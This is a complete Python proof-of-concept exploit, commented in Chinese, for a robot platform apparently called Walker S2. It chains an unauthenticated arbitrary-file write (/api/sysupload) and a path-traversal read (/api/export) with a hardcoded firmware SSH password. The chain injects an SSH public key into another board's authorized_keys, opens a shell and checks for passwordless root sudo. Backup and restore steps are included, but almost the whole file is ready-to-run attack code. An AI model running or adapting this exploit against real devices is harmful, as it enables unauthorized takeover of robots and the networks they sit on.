#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Walker S2 · /api/sysupload 任意路径写 → RCE 完整链 PoC（无前置凭证）

链路:
  A  无害写验证   写 vision 容器 /tmp 探针 → /api/export 读回 → 证明任意路径写
  R  RCE（motion） 生成临时 RSA keypair →
       1) 探针: sysupload board_name=motion 写 motion /tmp → 用硬编码凭证 <密码_01> 读回，
          确认后端 SFTP 跨板写真的落地
       2) 备份 motion 板 /home/walker/.ssh/authorized_keys（<密码_01> 读，base64）
       3) 注入: sysupload board_name=motion 把"原内容+新公钥"写进
          motion 板 /home/walker/.ssh/authorized_keys
       4) 拿 shell: ssh walker@motion 用新私钥登录 → sudo -n → root → SHELL ✅
       5) 默认自动恢复原 authorized_keys（--keep 保留新公钥）

  为什么打 motion 不打 vision: vision 容器 /root/.ssh 是「只读 bind-mount」
  （宿主 walker 的 ~/.ssh 以 ro 挂入容器），sysupload 写它返回 HTTP 500，key 注入不可行。
  motion 板是普通 Linux，/home/walker/.ssh 可写，且后端 SFTP 凭证 <密码_01> 固件里写死。

用法:
    python sysupload_rce.py                       # 阶段 A 仅无害写验证
    python sysupload_rce.py --rce                 # A + R 完整 RCE（motion 板 shell）
    python sysupload_rce.py --rce --keep          # RCE 后保留新公钥
    python sysupload_rce.py --rce --motion-host 192.168.11.2

注意:
    - 阶段 R 会临时修改 motion 板 authorized_keys，先备份、默认恢复。
    - 备份/恢复走 <密码_01>（硬编码凭证，属漏洞一部分）；纯 HTTP 无凭证的是注入那步。
"""
import argparse
import base64
import io
import json
import os
import secrets
import sys
import tarfile
import time

import paramiko
import requests

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

VISION = "192.168.11.3"      # :5000 t800-web-backend（vision 容器）
MOTION = "192.168.11.2"      # RCE 目标（motion 板）
MAP_ROOT = "/etc/walker/map"  # export/rename 的基准目录
MOTION_AUTHKEYS = "/home/walker/.ssh/authorized_keys"   # motion 板 walker 的授权文件（可写）
HARD_PASS = "aa"             # 固件硬编码 SFTP/SSH 凭证 <密码_01>

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
EVIDENCE_DIR = os.path.join(os.path.dirname(SCRIPT_DIR), "evidence")


def traversal(abs_path: str) -> str:
    depth = len([s for s in MAP_ROOT.split("/") if s])
    return "../" * depth + abs_path.lstrip("/")


def api_export_read(host: str, abs_path: str) -> bytes | None:
    """用 /api/export 路径穿越读回文件（用于验证写入）"""
    r = requests.post(f"http://{host}:5000/api/export",
                      json={"map_names": [traversal(abs_path)]}, timeout=15)
    if r.status_code != 200:
        return None
    t = tarfile.open(fileobj=io.BytesIO(r.content), mode="r:*")
    for m in t.getmembers():
        f = t.extractfile(m)
        if f:
            return f.read()
    return None


def sysupload_write(host: str, abs_path: str, content: bytes, board: str = "vision", filename: str = "upload.bin"):
    """POST /api/sysupload 任意路径写
    board=vision : 内容写到 abs_path 本身（file_path 里 /filename 只是展示拼接）
    board=motion : SFTP 写 motion 板，落点 = abs_path + '/' + filename（path 视为目录）"""
    print(f"[>] POST http://{host}:5000/api/sysupload")
    print(f"    multipart: file=<{filename} {len(content)}B>  path={abs_path!r}  board_name={board!r}")
    files = {"file": (filename, content)}
    data = {"path": abs_path, "board_name": board}
    r = requests.post(f"http://{host}:5000/api/sysupload",
                      files=files, data=data, timeout=20)
    print(f"[<] HTTP {r.status_code}  {r.text[:300]}")
    return r


def ssh_cmd(host: str, user: str, password: <密码_01>, cmd: str) -> tuple[str, str]:
    """ssh 密码执行单条命令，返回 (stdout, stderr)"""
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    cli.connect(host, username=user, password=<密码_01>, timeout=15)
    _, o, e = cli.exec_command(cmd, timeout=25)
    out = o.read().decode(errors="replace")
    err = e.read().decode(errors="replace")
    cli.close()
    return out, err


def stage_a(host: str):
    print("\n" + "=" * 66)
    print("[ 阶段 A ] 无害写验证: 写 vision /tmp → 读回")
    print("=" * 66)
    rand = secrets.token_hex(4)
    p = f"/tmp/probe_{rand}.txt"
    content = f"sysupload probe {rand}\n".encode()
    sysupload_write(host, p, content)
    time.sleep(0.5)
    print(f"[*] 读回验证: export {p}")
    got = api_export_read(host, p)
    if got and got == content:
        print(f"[+] 读回一致: {got!r}  →  任意路径写成立 ✅")
        return True
    print(f"[!] 读回失败/不一致: {got!r}")
    return False


def stage_r(host: str, motion: str, keep: bool, force: bool):
    print("\n" + "=" * 66)
    print(f"[ 阶段 R ] RCE: sysupload board_name=motion → SFTP 写公钥 → ssh 拿 shell")
    print(f"[*] 注入目标: {motion}  {MOTION_AUTHKEYS}")
    print("=" * 66)

    key = paramiko.RSAKey.generate(2048)
    openssh_pub = key.get_name() + " " + key.get_base64() + " poc-research@local"
    print(f"[*] 生成临时 RSA keypair（2048，仅本次运行）")
    print(f"    公钥: {openssh_pub[:70]}...")

    # ---- 1) 探针: 验证 board_name=motion 的 SFTP 跨板写真的落地（已有目录 + 自定义文件名）----
    print("\n" + "-" * 66)
    print("[1] 探针: sysupload board_name=motion → 写 motion /tmp（已有目录 + 自定义文件名）")
    rand = secrets.token_hex(4)
    probe_name = f"motion_probe_{rand}.txt"
    probe_p = f"/tmp/{probe_name}"
    probe_content = f"motion sfprobe {rand}\n".encode()
    r = sysupload_write(host, "/tmp", probe_content, board="motion", filename=probe_name)
    if r.status_code != 200:
        print(f"[!] SFTP 跨板写被拒（HTTP {r.status_code}），链条中断。")
        print("    检查: vision 容器能否到 motion:22、后端是否启用 SFTP 分支。")
        return False
    time.sleep(0.5)
    print(f"[*] 用硬编码凭证 <密码_01> 读回 {probe_p}（motion 板）")
    out, err = ssh_cmd(motion, "walker", HARD_PASS, f"cat {probe_p}")
    if probe_content.decode() in out:
        print(f"[+] SFTP 跨板写落地 ✅（落点=path/filename，自定义文件名生效）  读回: {out.strip()!r}")
    else:
        print(f"[!] SFTP 写未落地: stdout={out[:100]!r} stderr={err[:100]!r}")
        print("    若报 'Is a directory'，说明后端把 path 当目录建且文件名固定，需换策略。")
        return False

    # ---- 2) 备份原 authorized_keys ----
    print("\n" + "-" * 66)
    print(f"[2] 备份 {MOTION_AUTHKEYS}（<密码_01> 读，base64 保存到本地）")
    b64, err = ssh_cmd(motion, "walker", HARD_PASS,
                       "base64 -w0 " + MOTION_AUTHKEYS + " 2>/dev/null || base64 " + MOTION_AUTHKEYS)
    b64 = b64.replace("\n", "").replace(" ", "")
    orig = base64.b64decode(b64) if b64 else b""
    if orig:
        print(f"    原内容 {len(orig)}B: {orig[:80]!r}...")
        os.makedirs(EVIDENCE_DIR, exist_ok=True)
        with open(os.path.join(EVIDENCE_DIR, "backup_authorized_keys.motion"), "wb") as f:
            f.write(orig)
        print(f"    已存: evidence/backup_authorized_keys.motion")
    else:
        print(f"[!] 备份为空/失败（stderr: {err[:100]!r}）。若确认原文件不存在，--force 继续。")
        if not force:
            return False
        orig = b""

    # ---- 3.0) 清理容器内残留目录 ----
    # 后端总是先在容器本地写 path/filename。若历史实验把 /home/walker/.ssh/authorized_keys
    # 建成了目录，本地 open() 会 EISDIR。用 rename-folder 纯 HTTP 把它移走；新设备无残留时 404 忽略。
    print("\n" + "-" * 66)
    print("[3.0] 清理容器内残留目录（rename-folder: /home/walker/.ssh/authorized_keys → ..._poc_bak）")
    try:
        rr = requests.post(f"http://{host}:5000/api/rename-folder",
                           json={"old_name": "authorized_keys",
                                 "new_name": "authorized_keys_poc_bak",
                                 "target_dir": "/home/walker/.ssh"}, timeout=15)
        print(f"    HTTP {rr.status_code}  {rr.text[:160]}")
    except Exception as ex:
        print(f"    (跳过: {ex})")

    # ---- 3) 注入新公钥 ----
    print("\n" + "-" * 66)
    print(f"[3] 注入: path=/home/walker/.ssh  filename=authorized_keys（SFTP 落点 = {MOTION_AUTHKEYS}）")
    new_content = orig.rstrip(b"\n") + b"\n" + openssh_pub.encode() + b"\n"
    r = sysupload_write(host, "/home/walker/.ssh", new_content, board="motion", filename="authorized_keys")
    if r.status_code != 200:
        print(f"[!] 注入被拒（HTTP {r.status_code}）。若已写入需手工恢复（见 evidence 备份）。")
        return False

    # ---- 4) 用新私钥登录拿 shell ----
    time.sleep(0.5)
    print("\n" + "-" * 66)
    print(f"[4] ssh 登录 {motion} 用户 walker（新私钥）")
    got_shell = False
    try:
        cli = paramiko.SSHClient()
        cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        cli.connect(motion, username="walker", pkey=key, timeout=15)
        _, o, e = cli.exec_command("id; whoami; sudo -n id 2>&1 | head -1; hostname", timeout=25)
        out = o.read().decode(errors="replace")
        err = e.read().decode(errors="replace")
        print(f"[<] 命令输出:\n{out}")
        if err.strip():
            print(f"[!] stderr: {err}")
        print("[+] SHELL 达成 ✅（已通过注入的新公钥登录并执行命令）")
        keyfile = os.path.join(SCRIPT_DIR, "rce_tmp_key.pem")
        with open(keyfile, "w") as f:
            key.write_private_key(f)
        print(f"   手动交互 shell 命令:  ssh -i {keyfile} walker@{motion}")
        cli.close()
        got_shell = True
    except Exception as ex:
        print(f"[!] SSH 失败: {ex}")

    # ---- 5) 清理探针 + 恢复 ----
    print("\n" + "-" * 66)
    if keep:
        print(f"[5] --keep 生效，保留新公钥在 {MOTION_AUTHKEYS}")
    else:
        print(f"[5] 清理探针 + 恢复原 {MOTION_AUTHKEYS}")
        b64 = base64.b64encode(orig).decode()
        cmd = (f"rm -f {probe_p}; "
               f"echo {b64} | base64 -d > {MOTION_AUTHKEYS}; "
               f"chmod 600 {MOTION_AUTHKEYS}; "
               f"wc -c {MOTION_AUTHKEYS}")
        out, err = ssh_cmd(motion, "walker", HARD_PASS, cmd)
        print(f"    wc -c -> {out.strip()}  (原文件 {len(orig)}B)")
        if out.strip().split()[0] == str(len(orig)):
            print("[+] 已恢复（新公钥已移除）✅")
        else:
            print(f"[!] 恢复大小不符，请手工用 evidence/backup_authorized_keys.motion 恢复")

    return got_shell


def restore_motion(motion: str):
    """从本地备份恢复 motion 板 authorized_keys（--restore）"""
    print("=" * 66)
    print(f"[ 恢复 ] 从 evidence 备份恢复 {MOTION_AUTHKEYS} @ {motion}")
    print("=" * 66)
    bpath = os.path.join(EVIDENCE_DIR, "backup_authorized_keys.motion")
    if not os.path.exists(bpath):
        print(f"[!] 无备份文件: {bpath}")
        return
    orig = open(bpath, "rb").read()
    b64 = base64.b64encode(orig).decode()
    cmd = (f"echo {b64} | base64 -d > {MOTION_AUTHKEYS}; "
           f"chmod 600 {MOTION_AUTHKEYS}; wc -c {MOTION_AUTHKEYS}")
    out, err = ssh_cmd(motion, "walker", HARD_PASS, cmd)
    print(f"[<] wc -c -> {out.strip()}  (应为 {len(orig)}B)")
    if out.strip().split()[0] == str(len(orig)):
        print("[+] 已恢复 ✅")
    else:
        print(f"[!] 恢复大小不符（stderr: {err[:120]!r}），请检查")


def main():
    ap = argparse.ArgumentParser(description="/api/sysupload 任意路径写 → RCE")
    ap.add_argument("--host", default=VISION, help="API 所在 vision 板")
    ap.add_argument("--motion-host", default=MOTION, help="RCE 注入目标 motion 板")
    ap.add_argument("--rce", action="store_true", help="执行阶段 R（motion 板 key 注入 RCE）")
    ap.add_argument("--keep", action="store_true", help="RCE 后保留新公钥（默认恢复）")
    ap.add_argument("--force", action="store_true", help="备份读空时仍继续（仅当确定原文件不存在）")
    ap.add_argument("--restore", action="store_true",
                    help="仅恢复 motion authorized_keys（从 evidence/backup_authorized_keys.motion），不再探测")
    ap.add_argument("--read", default=None,
                    help="用 export 路径穿越读 vision 容器内任意路径（只读，调试后端源码用）")
    args = ap.parse_args()

    if args.read:
        data = api_export_read(args.host, args.read)
        print(f"[*] {args.read}  ->  {len(data) if data else 0}B")
        print((data.decode(errors="replace") if data else "(空/失败)")[:6000])
        return

    if args.restore:
        restore_motion(args.motion_host)
        return

    print(f"[*] 目标 vision(API)={args.host}  motion(RCE)={args.motion_host}")
    ok_a = stage_a(args.host)
    if not ok_a:
        print("\n[!] 阶段 A 未通过，终止（任意写不可达则 RCE 不成立）")
        return

    if args.rce:
        stage_r(args.host, args.motion_host, args.keep, args.force)


if __name__ == "__main__":
    main()
